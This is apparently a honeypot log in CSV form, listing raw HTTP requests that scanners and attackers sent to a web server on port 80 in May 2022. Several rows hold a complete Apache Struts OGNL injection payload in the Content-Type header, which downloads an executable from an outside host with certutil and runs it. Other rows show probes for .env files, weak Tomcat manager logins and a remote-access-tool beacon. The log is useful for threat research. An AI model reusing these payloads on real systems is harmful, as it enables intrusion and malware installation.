ID,ADDR,VALUE,TIME
REQ_1_P80,,b'',2022-05-03 00:05:56.772458
REQ_2_P80,,"b""GET /index.action HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/poaoaistcanaqux11919.exe & cmd.exe /c C:/Windows/temp/poaoaistcanaqux11919.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/index.action\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.772458
REQ_3_P80,,b'\x04\x01\x00P\x05\xbc\xd2e\x00',2022-05-03 00:05:56.772458
REQ_4_P80,,b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-03 00:05:56.772458
REQ_5_P80,,b'\x05\x01\x00',2022-05-03 00:05:56.772458
REQ_6_P80,,b'GET / HTTP/1.1\r\nHost: 3.14.69.228:80\r\nUser-Agent: Go-http-client/1.1\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n',2022-05-03 00:05:56.772458
REQ_7_P80,,"b'GET /favicon.ico HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: image/webp,image/apng,image/*,*/*;q=0.8\r\nReferer: http://3.14.69.228/login.cgi\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.772458
REQ_8_P80,,"b'GET /login.cgi HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.772458
REQ_9_P80,,"b""GET /index.do HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/poaoaistcanaqux11919.exe & cmd.exe /c C:/Windows/temp/poaoaistcanaqux11919.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/index.do\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.772458
REQ_10_P80,,"b'GET http://110.249.212.46/testget?q=23333&port=80 HTTP/1.1\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nExpires: 0\r\n\r\n'",2022-05-03 00:05:56.772458
REQ_11_P80,,"b""GET /struts2-rest-showcase/orders.xhtml HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/poaoaistcanaqux11919.exe & cmd.exe /c C:/Windows/temp/poaoaistcanaqux11919.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/struts2-rest-showcase/orders.xhtml\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.780875
REQ_12_P80,,b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\nUser-Agent: HTTP Banner Detection (https://security.ipip.net)\r\nConnection: close\r\n\r\n',2022-05-03 00:05:56.780875
REQ_13_P80,,b'\x01\x02\x03\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-03 00:05:56.780875
REQ_14_P80,,"b""145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==""",2022-05-03 00:05:56.780875
REQ_15_P80,,"b'GET http://5.188.210.101/echo.php HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nPragma: no-cache\r\nCache-control: no-cache\r\nCookie: cookie=ok\r\nReferer: https://www.google.com/\r\nHost: 5.188.210.101\r\nConnection: close\r\nContent-Length: 0\r\n\r\n'",2022-05-03 00:05:56.780875
REQ_16_P80,,b'GET /Lists/admin.php HTTP/1.1\r\nUser-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)\r\nAccept: */*\r\n\r\n',2022-05-03 00:05:56.780875
REQ_17_P80,,"b'GET /login.cgi HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.780875
REQ_18_P80,,"b""GET /index.do HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/idxbslorzqhxpsi29850.exe & cmd.exe /c C:/Windows/temp/idxbslorzqhxpsi29850.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/index.do\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.780875
REQ_19_P80,,b'GET / HTTP/1.0\r\nUser-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)\r\nAccept: */*\r\n\r\n',2022-05-03 00:05:56.780875
REQ_20_P80,,b'GET / HTTP/1.0\r\nUser-Agent: NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com\r\nAccept: */*\r\n\r\n',2022-05-03 00:05:56.780875
REQ_21_P80,,"b'GET /manager/html HTTP/1.1\r\nAccept: text/html, application/xhtml+xml, */*\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)\r\nHost: 3.14.69.228:80\r\nAuthorization: Basic Og==\r\nCache-Control: max-stale=0\r\nConnection: Keep-Alive\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_22_P80,,"b""GET /struts2-rest-showcase/orders.xhtml HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/idxbslorzqhxpsi29850.exe & cmd.exe /c C:/Windows/temp/idxbslorzqhxpsi29850.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/struts2-rest-showcase/orders.xhtml\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.796007
REQ_23_P80,,"b'GET /login.cgihttp://3.14.69.228/login.cgi HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_24_P80,,"b""GET /index.action HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/idxbslorzqhxpsi29850.exe & cmd.exe /c C:/Windows/temp/idxbslorzqhxpsi29850.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/index.action\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.796007
REQ_25_P80,,"b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_26_P80,,"b'GET /favicon.ico HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: image/webp,image/apng,image/*,*/*;q=0.8\r\nReferer: http://3.14.69.228/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_27_P80,,b'GET /manager/html HTTP/1.1\r\nConnection: Keep-Alive\r\nAuthorization: Basic YWRtaW46\r\nHost: 3.14.69.228\r\n\r\n',2022-05-03 00:05:56.796007
REQ_28_P80,,"b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: deflate, gzip, identity\r\nAccept-Language: en-US;q=0.6,en;q=0.4\r\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_29_P80,"('95.234.154.62', 4089)",b'GET / HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n',2022-05-03 20:57:03.624360
REQ_30_P80,"('95.234.154.62', 4094)",b'GET / HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n',2022-05-03 20:58:24.881955
REQ_31_P80,"('95.234.154.62', 4095)",b'GET / HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n',2022-05-03 20:58:27.291330
REQ_32_P80,"('3.19.26.92', 60407)","b'GET /_profiler/phpinfo HTTP/1.1\r\nHost: 54.80.75.64\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\n\r\n'",2022-05-03 21:05:38.796114
REQ_33_P80,"('181.40.72.94', 36860)","b'GET / HTTP/1.1\r\nHost: 54.80.75.64:80\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-03 21:08:02.997805
REQ_34_P80,"('95.234.154.62', 4339)",b'GET / HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n',2022-05-03 21:29:26.677724
REQ_35_P80,"('185.254.196.115', 38912)","b'GET /.env HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-03 21:53:26.067931
REQ_36_P80,"('157.230.216.203', 46488)",b'GET /ab2g HTTP/1.1\r\n\r\n',2022-05-03 22:12:14.037100
REQ_37_P80,"('157.230.216.203', 46516)",b'GET /ab2h HTTP/1.1\r\n\r\n',2022-05-03 22:12:14.062397
REQ_38_P80,"('3.145.57.222', 59476)",b'',2022-05-03 22:26:37.935197
REQ_39_P80,"('3.145.57.222', 55852)",b'',2022-05-03 22:26:54.114406
REQ_40_P80,"('3.145.57.222', 55969)",b'',2022-05-03 22:27:10.096455
REQ_41_P80,"('192.241.222.228', 37614)",b'MGLNDD_54.80.75.64_80\n',2022-05-03 22:43:11.969826
REQ_42_P80,"('35.88.195.237', 60505)","b'GET /.env HTTP/1.1\r\nHost: ec2-54-80-75-64.compute-1.amazonaws.com\r\nUser-agent: Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-03 22:49:48.424049
REQ_43_P80,"('104.152.52.151', 58728)",b'GET / HTTP/1.0\r\nUser-Agent: masscan/1.3 (https://github.com/robertdavidgraham/masscan)\r\nAccept: */*\r\n\r\n',2022-05-03 22:58:59.817186
REQ_44_P80,"('185.254.196.115', 52144)","b'GET /.env HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-03 23:19:02.828279
REQ_45_P80,"('193.46.255.49', 45294)","b'GET / HTTP/1.1\r\nTE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\nHost: 54.80.75.64:80\r\nUser-Agent: libwww-perl/6.62\r\n\r\n'",2022-05-03 23:22:42.009941
REQ_46_P80,"('45.61.188.169', 34726)","b'GET /config/getuser?index=0 HTTP/1.1\r\nHost: 54.80.75.64:80\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",2022-05-04 00:10:25.261089
REQ_47_P80,"('185.254.196.218', 50562)","b'GET /.env HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-04 00:23:26.126772
REQ_48_P80,"('54.216.248.149', 48192)",b'CONNECT 1.1.1.1:443 HTTP/1.1\r\nHost: 1.1.1.1:443\r\nUser-Agent: Go-http-client/1.1\r\n\r\n',2022-05-04 00:31:34.667675
REQ_49_P80,"('5.239.144.92', 58476)","b'GET / HTTP/1.1\r\nHost: 54.80.75.64:80\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\r\nContent-Length: 0\r\n\r\n'",2022-05-04 00:40:29.610837
REQ_50_P80,"('185.254.196.115', 42222)","b'GET /.env HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-04 00:50:53.432215
REQ_51_P80,"('186.224.251.136', 18876)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:16.639773
REQ_52_P80,"('186.224.251.136', 17878)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:16.920686
REQ_53_P80,"('186.224.251.136', 17885)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:17.215183
REQ_54_P80,"('186.224.251.136', 18101)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:17.587541
REQ_55_P80,"('186.224.251.136', 17202)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:17.871776
REQ_56_P80,"('186.224.251.136', 18249)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:18.174591
REQ_57_P80,"('186.224.251.136', 17607)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:18.601143
REQ_58_P80,"('186.224.251.136', 18815)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:18.879776
REQ_59_P80,"('186.224.251.136', 18223)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:19.178161
REQ_60_P80,"('186.224.251.136', 18293)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:19.609818
REQ_61_P80,"('186.224.251.136', 17031)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:19.886106
REQ_62_P80,"('186.224.251.136', 17250)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:20.180483
REQ_63_P80,"('186.224.251.136', 18057)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:20.637311
REQ_64_P80,"('186.224.251.136', 17548)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:20.937325
REQ_65_P80,"('186.224.251.136', 17838)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:21.221859
REQ_66_P80,"('186.224.251.136', 17814)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:21.604108
REQ_67_P80,"('186.224.251.136', 17122)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:21.899704
REQ_68_P80,"('186.224.251.136', 18721)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:22.195907
REQ_69_P80,"('186.224.251.136', 18010)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:22.604491
REQ_70_P80,"('186.224.251.136', 18354)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:22.901976
REQ_71_P80,"('186.224.251.136', 18186)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:23.181994
REQ_72_P80,"('186.224.251.136', 17970)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:23.580352
REQ_73_P80,"('186.224.251.136', 18803)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:23.880569
REQ_74_P80,"('186.224.251.136', 17945)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:24.178282
REQ_75_P80,"('186.224.251.136', 17980)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:24.607590
REQ_76_P80,"('186.224.251.136', 17154)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:24.901521
REQ_77_P80,"('186.224.251.136', 18426)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:25.200006
REQ_78_P80,"('186.224.251.136', 17123)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:25.611451
REQ_79_P80,"('186.224.251.136', 18686)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:25.910339
REQ_80_P80,"('186.224.251.136', 17228)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:26.209829
REQ_81_P80,"('186.224.251.136', 17813)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:26.630818
REQ_82_P80,"('186.224.251.136', 18618)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:26.907980
REQ_83_P80,"('186.224.251.136', 18441)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:27.205081
REQ_84_P80,"('186.224.251.136', 18226)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:27.615458
REQ_85_P80,"('186.224.251.136', 18833)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:27.918177
REQ_86_P80,"('186.224.251.136', 18024)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:28.196925
REQ_87_P80,"('186.224.251.136', 17358)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:28.603387
REQ_88_P80,"('186.224.251.136', 18601)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:28.901904
REQ_89_P80,"('186.224.251.136', 18853)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:29.215234
REQ_90_P80,"('186.224.251.136', 18578)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:29.630992
REQ_91_P80,"('186.224.251.136', 18571)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:29.911707
REQ_92_P80,"('186.224.251.136', 18403)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:30.185618
REQ_93_P80,"('186.224.251.136', 18287)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:30.624781
REQ_94_P80,"('186.224.251.136', 18749)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:30.902355
REQ_95_P80,"('186.224.251.136', 17403)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:31.201880
REQ_96_P80,"('186.224.251.136', 18017)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:31.631070
REQ_97_P80,"('186.224.251.136', 17911)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:31.911252
REQ_98_P80,"('186.224.251.136', 18803)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:32.210563
